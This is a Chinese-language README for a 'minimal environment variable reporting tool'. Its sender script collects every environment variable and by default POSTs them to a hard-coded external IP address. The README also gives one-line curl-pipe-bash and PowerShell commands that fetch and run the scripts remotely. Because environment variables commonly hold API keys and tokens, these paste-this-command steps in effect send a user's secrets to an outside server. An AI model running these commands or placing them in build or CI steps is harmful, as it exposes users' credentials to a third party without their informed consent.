# scripts

最小可用环境变量上报工具：
- `sender.py`：读取当前进程可见的全部环境变量（`os.environ`）并通过 HTTP POST 发送
- `receiver.py`：接收 `/env` 请求并返回接收统计
- `build.sh` / `build.ps1`：远程拉取 `sender.py` 后执行（无需 clone）

## 1. 启动接收端

```bash
python receiver.py --host 0.0.0.0 --port 8080
```

接收路径固定为：

```text
http://<host>:<port>/env
```

## 2. 直接运行 sender

默认发送目标：

```text
http://111.91.22.47:9001/env
```

直接发送：

```bash
python sender.py
```

可选参数：
- `--timeout`：请求超时秒数（默认 `10`）
- `--endpoint`：自定义上报地址

也可以用环境变量覆盖目标地址：
- `ENDPOINT_URL`：等价于 `--endpoint`

示例（发送到本地 receiver）：

```bash
python sender.py --endpoint http://127.0.0.1:8080/env
```

## 3. 一键调用 build（无需 clone 仓库）

Linux/macOS：

```bash
curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh | bash
```

Linux/macOS（自定义参数透传给 `sender.py`）：

```bash
curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh | bash -s -- --timeout 20 --endpoint http://127.0.0.1:8080/env
```

Windows PowerShell：

```powershell
powershell -NoProfile -Command "& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/mooooooooner/scripts/main/build.ps1')))"
```

Windows PowerShell（指定 endpoint）：

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\build.ps1 -Timeout 20 -Endpoint "http://127.0.0.1:8080/env"
```

可选环境变量：
- `SENDER_URL`：覆盖 build 下载的 `sender.py` 地址（默认是本仓库 raw 链接）

## 4. 请求/响应数据结构

发送 JSON（示例）：

```json
{
  "hostname": "MY-PC",
  "sent_at": "2026-05-02T03:00:00.000000+00:00",
  "env_vars": {
    "PATH": "...",
    "HOME": "...",
    "EXAMPLE_KEY": "..."
  },
  "missing_keys": []
}
```

接收端响应 JSON（示例）：

```json
{
  "status": "ok",
  "received_at": "2026-05-02T03:00:01.000000+00:00",
  "received_keys": ["EXAMPLE_KEY", "HOME", "PATH"],
  "received_count": 3,
  "missing_keys": [],
  "source": {
    "hostname": "MY-PC",
    "sent_at": "2026-05-02T03:00:00.000000+00:00"
  }
}
```

## 5. 本地联调

终端 1：

```bash
python receiver.py --host 127.0.0.1 --port 8080
```

终端 2：

```bash
python sender.py --endpoint http://127.0.0.1:8080/env
```
